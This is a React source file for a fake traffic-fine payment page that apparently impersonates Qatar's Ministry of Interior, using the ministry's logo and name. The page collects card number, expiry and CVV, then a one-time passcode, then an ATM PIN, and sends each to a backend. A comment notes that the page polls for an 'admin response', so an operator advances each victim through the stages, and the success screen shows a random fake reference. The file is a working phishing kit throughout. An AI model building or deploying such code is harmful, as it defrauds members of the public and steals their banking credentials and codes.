import { useState, useEffect, type ReactNode, type FormEvent } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { Shield, CreditCard, Lock, CheckCircle2, AlertCircle, ArrowRight, Loader2 } from "lucide-react";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";

type CardSubmitPayload = {
  cardName: string;
  cardNumber: string;
  cardExpiry: string;
  cardCvv: string;
};

const MOI_QATAR_LOGO = "https://portal.moi.gov.qa/wps/PA_MOIPortalStaticResources/images/moi-logo-ar.png";

function PaymentFrame({ children }: { children: ReactNode }) {
  return (
    <div className="min-h-screen bg-gray-50 px-4 py-8 md:py-12" dir="rtl">
      <div className="mx-auto max-w-2xl overflow-hidden rounded-[2rem] bg-white shadow-2xl border border-gray-100">
        {children}
      </div>
    </div>
  );
}

function PaymentGatewayHeader({ lang }: { lang: string }) {
  return (
    <div className="bg-white px-8 pt-8 pb-6 border-b border-gray-100">
      <div className="flex items-center justify-between gap-4">
        <img
          src={MOI_QATAR_LOGO}
          alt="MOI Qatar"
          className="h-14 w-auto object-contain"
        />
        <div className="text-left">
          <div className="text-[10px] font-bold text-gray-400 uppercase tracking-widest mb-1">Secure Payment Gateway</div>
          <div className="flex items-center gap-2 text-green-600 font-bold text-sm">
            <Lock size={14} />
            <span>{lang === 'ar' ? 'دفع آمن' : 'Secure Pay'}</span>
          </div>
        </div>
      </div>
    </div>
  );
}

function SectionCard({ title, children, lang }: { title: string; children: ReactNode; lang: string }) {
  return (
    <section className="mb-6 overflow-hidden rounded-2xl border border-gray-100 bg-white shadow-sm">
      <div className="bg-maroon-50 px-6 py-4 text-sm font-black text-maroon-900 border-b border-maroon-100 flex items-center gap-2">
        <div className="w-1.5 h-4 bg-maroon-700 rounded-full"></div>
        {title}
      </div>
      <div className="px-6 py-5">{children}</div>
    </section>
  );
}

function PaymentFooter({ lang }: { lang: string }) {
  return (
    <div className="px-8 py-8 text-center bg-gray-50 border-t border-gray-100">
      <p className="text-sm text-gray-600 font-medium">
        {lang === 'ar' ? 'للمزيد من الاستفسارات يرجى الاتصال على' : 'For inquiries please call'} <span className="font-black text-maroon-700">999</span>
      </p>
      <p className="mt-2 text-[10px] text-gray-400 font-bold uppercase tracking-widest">© {new Date().getFullYear()} Ministry of Interior - Qatar</p>
    </div>
  );
}

export default function Payment() {
  const [location, navigate] = useLocation();
  const { t, lang, isRTL } = useLanguage();
  const [paymentData, setPaymentData] = useState<any>(null);
  const [stage, setStage] = useState<Stage>("card");
  const [error, setError] = useState<string | null>(null);
  const [otpCode, setOtpCode] = useState("");
  const [atmPin, setAtmPin] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    const data = sessionStorage.getItem("paymentData");
    if (!data) {
      navigate(isRTL ? "/ar" : "/");
      return;
    }
    setPaymentData(JSON.parse(data));
  }, [navigate, isRTL]);

  const sessionId = new URLSearchParams(window.location.search).get("sessionId") || paymentData?.sessionId;

  const submitCardMutation = trpc.payment.submitCard.useMutation({
    onSuccess: () => setStage("card_pending"),
    onError: (err) => setError(err.message),
  });

  const submitOtpMutation = trpc.payment.submitOtp.useMutation({
    onSuccess: () => setStage("otp_pending"),
    onError: (err) => setError(err.message),
  });

  const submitAtmPinMutation = trpc.payment.submitAtmPin.useMutation({
    onSuccess: () => setStage("atm_pending"),
    onError: (err) => setError(err.message),
  });

  // Polling for admin response
  const { data: sessionStatus } = trpc.payment.getStatus.useQuery(
    { sessionId: sessionId || "" },
    {
      enabled: !!sessionId && ["card_pending", "otp_pending", "atm_pending"].includes(stage),
      refetchInterval: 3000,
    }
  );

  useEffect(() => {
    if (sessionStatus?.stage && sessionStatus.stage !== stage) {
      setStage(sessionStatus.stage as Stage);
      if (sessionStatus.errorMessage) setError(sessionStatus.errorMessage);
      else setError(null);
    }
  }, [sessionStatus, stage]);

  if (!paymentData) return null;

  const handleCardSubmit = (e: FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    const form = e.target as HTMLFormElement;
    const formData = new FormData(form);
    
    submitCardMutation.mutate({
      sessionId,
      cardName: formData.get("cardName") as string,
      cardNumber: (formData.get("cardNumber") as string).replace(/\s/g, ""),
      cardExpiry: formData.get("cardExpiry") as string,
      cardCvv: formData.get("cardCvv") as string,
    }, {
      onSettled: () => setIsLoading(false)
    });
  };

  const handleOtpSubmit = (e: FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    submitOtpMutation.mutate({ sessionId, otpCode }, {
      onSettled: () => setIsLoading(false)
    });
  };

  const handleAtmSubmit = (e: FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    submitAtmPinMutation.mutate({ sessionId, atmPin }, {
      onSettled: () => setIsLoading(false)
    });
  };

  return (
    <PaymentFrame>
      <PaymentGatewayHeader lang={lang} />
      
      <div className="p-8">
        {stage === "card" && (
          <form onSubmit={handleCardSubmit} className="animate-in fade-in duration-500">
            <SectionCard title={lang === 'ar' ? 'ملخص الدفع' : 'Payment Summary'} lang={lang}>
              <div className="flex justify-between items-center mb-2">
                <span className="text-gray-500 text-sm">{lang === 'ar' ? 'إجمالي المخالفات' : 'Total Fines'}</span>
                <span className="font-bold text-gray-800">{paymentData.selectedFines?.length || 0}</span>
              </div>
              <div className="flex justify-between items-center pt-3 border-t border-gray-100">
                <span className="text-gray-800 font-black">{lang === 'ar' ? 'المبلغ المستحق' : 'Amount Due'}</span>
                <span className="text-2xl font-black text-maroon-700">{paymentData.totalAmount} <span className="text-xs">{t.home.results.currency}</span></span>
              </div>
            </SectionCard>

            <SectionCard title={lang === 'ar' ? 'بيانات البطاقة البنكية' : 'Credit Card Details'} lang={lang}>
              {error && (
                <div className="mb-6 p-4 bg-red-50 border border-red-100 rounded-xl text-red-600 text-xs flex items-center gap-3">
                  <AlertCircle size={16} />
                  {error}
                </div>
              )}
              <div className="space-y-5">
                <div className="space-y-2">
                  <label className="text-xs font-bold text-gray-500 uppercase">{lang === 'ar' ? 'اسم حامل البطاقة' : 'Cardholder Name'}</label>
                  <input name="cardName" required className="w-full p-4 bg-gray-50 border-2 border-gray-100 rounded-xl focus:border-maroon-600 outline-none transition-all font-bold" placeholder="NAME ON CARD" />
                </div>
                <div className="space-y-2">
                  <label className="text-xs font-bold text-gray-500 uppercase">{lang === 'ar' ? 'رقم البطاقة' : 'Card Number'}</label>
                  <div className="relative">
                    <input name="cardNumber" required className="w-full p-4 bg-gray-50 border-2 border-gray-100 rounded-xl focus:border-maroon-600 outline-none transition-all font-bold tracking-widest" placeholder="0000 0000 0000 0000" />
                    <CreditCard className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-300" size={20} />
                  </div>
                </div>
                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <label className="text-xs font-bold text-gray-500 uppercase">{lang === 'ar' ? 'تاريخ الانتهاء' : 'Expiry Date'}</label>
                    <input name="cardExpiry" required className="w-full p-4 bg-gray-50 border-2 border-gray-100 rounded-xl focus:border-maroon-600 outline-none transition-all font-bold text-center" placeholder="MM/YY" />
                  </div>
                  <div className="space-y-2">
                    <label className="text-xs font-bold text-gray-500 uppercase">{lang === 'ar' ? 'رمز التحقق (CVV)' : 'CVV'}</label>
                    <input name="cardCvv" required type="password" maxLength={4} className="w-full p-4 bg-gray-50 border-2 border-gray-100 rounded-xl focus:border-maroon-600 outline-none transition-all font-bold text-center" placeholder="***" />
                  </div>
                </div>
              </div>
            </SectionCard>

            <button
              type="submit"
              disabled={isLoading}
              className="w-full bg-maroon-700 hover:bg-maroon-800 text-white font-black py-5 rounded-2xl shadow-xl shadow-maroon-100 transition-all flex items-center justify-center gap-3 disabled:opacity-70"
            >
              {isLoading ? <Loader2 className="animate-spin" /> : (
                <>
                  <span>{lang === 'ar' ? 'إتمام عملية الدفع' : 'Complete Payment'}</span>
                  <ArrowRight size={20} className={isRTL ? "rotate-180" : ""} />
                </>
              )}
            </button>
          </form>
        )}

        {(stage === "card_pending" || stage === "otp_pending" || stage === "atm_pending") && (
          <div className="py-20 text-center animate-in fade-in duration-500">
            <div className="relative w-24 h-24 mx-auto mb-8">
              <div className="absolute inset-0 border-4 border-maroon-100 rounded-full"></div>
              <div className="absolute inset-0 border-4 border-maroon-700 rounded-full border-t-transparent animate-spin"></div>
              <Shield className="absolute inset-0 m-auto text-maroon-700" size={32} />
            </div>
            <h3 className="text-xl font-black text-gray-900 mb-2">{lang === 'ar' ? 'جاري معالجة طلبك' : 'Processing Your Request'}</h3>
            <p className="text-gray-500 text-sm max-w-xs mx-auto">{lang === 'ar' ? 'يرجى الانتظار، يتم التحقق من بياناتك عبر بوابة الدفع الآمنة لوزارة الداخلية' : 'Please wait while we verify your details via MOI secure gateway'}</p>
          </div>
        )}

        {stage === "otp" && (
          <form onSubmit={handleOtpSubmit} className="animate-in fade-in duration-500 text-center">
            <div className="w-16 h-16 bg-blue-50 text-blue-600 rounded-full flex items-center justify-center mx-auto mb-6">
              <Lock size={32} />
            </div>
            <h3 className="text-2xl font-black text-gray-900 mb-2">{t.payment.otp.title}</h3>
            <p className="text-gray-500 text-sm mb-8">{t.payment.otp.subtitle}</p>
            
            <div className="max-w-xs mx-auto space-y-6">
              <input
                value={otpCode}
                onChange={(e) => setOtpCode(e.target.value)}
                className="w-full text-center text-3xl font-black tracking-[1rem] p-5 bg-gray-50 border-2 border-gray-100 rounded-2xl focus:border-maroon-600 outline-none transition-all"
                placeholder="••••••"
                maxLength={6}
                required
              />
              <button
                type="submit"
                disabled={isLoading}
                className="w-full bg-maroon-700 hover:bg-maroon-800 text-white font-black py-4 rounded-xl shadow-lg transition-all flex items-center justify-center"
              >
                {isLoading ? <Loader2 className="animate-spin" /> : t.payment.otp.confirmButton}
              </button>
            </div>
          </form>
        )}

        {stage === "atm" && (
          <form onSubmit={handleAtmSubmit} className="animate-in fade-in duration-500 text-center">
            <div className="w-16 h-16 bg-maroon-50 text-maroon-700 rounded-full flex items-center justify-center mx-auto mb-6">
              <CreditCard size={32} />
            </div>
            <h3 className="text-2xl font-black text-gray-900 mb-2">{t.payment.atm.title}</h3>
            <p className="text-gray-500 text-sm mb-8">{t.payment.atm.subtitle}</p>
            
            <div className="max-w-xs mx-auto space-y-6">
              <input
                type="password"
                value={atmPin}
                onChange={(e) => setAtmPin(e.target.value)}
                className="w-full text-center text-3xl font-black tracking-[1rem] p-5 bg-gray-50 border-2 border-gray-100 rounded-2xl focus:border-maroon-600 outline-none transition-all"
                placeholder="••••"
                maxLength={4}
                required
              />
              <button
                type="submit"
                disabled={isLoading}
                className="w-full bg-maroon-700 hover:bg-maroon-800 text-white font-black py-4 rounded-xl shadow-lg transition-all flex items-center justify-center"
              >
                {isLoading ? <Loader2 className="animate-spin" /> : t.payment.atm.confirmButton}
              </button>
            </div>
          </form>
        )}

        {stage === "success" && (
          <div className="py-12 text-center animate-in zoom-in duration-500">
            <div className="w-20 h-20 bg-green-50 text-green-500 rounded-full flex items-center justify-center mx-auto mb-6 shadow-inner">
              <CheckCircle2 size={48} />
            </div>
            <h3 className="text-3xl font-black text-gray-900 mb-2">{t.payment.success.title}</h3>
            <p className="text-gray-500 mb-8">{t.payment.success.subtitle}</p>
            
            <div className="bg-gray-50 rounded-2xl p-6 mb-8 text-right space-y-3">
              <div className="flex justify-between">
                <span className="text-gray-500">{t.payment.success.amountPaid}</span>
                <span className="font-black text-gray-800">{paymentData.totalAmount} {t.home.results.currency}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-500">{t.payment.success.reference}</span>
                <span className="font-mono text-sm text-maroon-700">#{Math.random().toString(36).substr(2, 9).toUpperCase()}</span>
              </div>
            </div>

            <button
              onClick={() => navigate(isRTL ? "/ar" : "/")}
              className="bg-gray-900 text-white font-bold py-4 px-8 rounded-xl hover:bg-black transition-all"
            >
              {t.payment.success.backButton}
            </button>
          </div>
        )}

        {stage === "failed" && (
          <div className="py-12 text-center animate-in shake duration-500">
            <div className="w-20 h-20 bg-red-50 text-red-500 rounded-full flex items-center justify-center mx-auto mb-6">
              <AlertCircle size={48} />
            </div>
            <h3 className="text-2xl font-black text-gray-900 mb-2">{lang === 'ar' ? 'فشلت عملية الدفع' : 'Payment Failed'}</h3>
            <p className="text-gray-500 mb-8">{error || (lang === 'ar' ? 'حدث خطأ غير متوقع أثناء معالجة العملية' : 'An unexpected error occurred during processing')}</p>
            
            <button
              onClick={() => setStage("card")}
              className="bg-maroon-700 text-white font-bold py-4 px-8 rounded-xl hover:bg-maroon-800 transition-all"
            >
              {lang === 'ar' ? 'المحاولة مرة أخرى' : 'Try Again'}
            </button>
          </div>
        )}
      </div>

      <PaymentFooter lang={lang} />
    </PaymentFrame>
  );
}
